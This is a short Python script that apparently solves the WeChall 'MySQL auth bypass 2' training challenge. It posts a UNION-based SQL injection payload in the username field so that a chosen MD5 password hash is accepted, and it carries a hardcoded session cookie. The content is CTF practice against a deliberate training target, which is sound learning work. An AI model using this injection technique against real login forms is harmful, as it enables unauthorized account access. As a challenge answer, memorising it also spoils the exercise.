import requests

cookies = {"WC": "11068160-37667-z1PuydshfLuLpXFI"}
url = "https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"
# " SELECT * FROM users WHERE username='admin' union select 1,'admin',md5('p'); #'";
data = {"username":"blablabla' union select 100,'admin',md5('p'); #", "password":"p", "login":"Login"}
r = requests.post(url, cookies=cookies, data=data)
print r.text
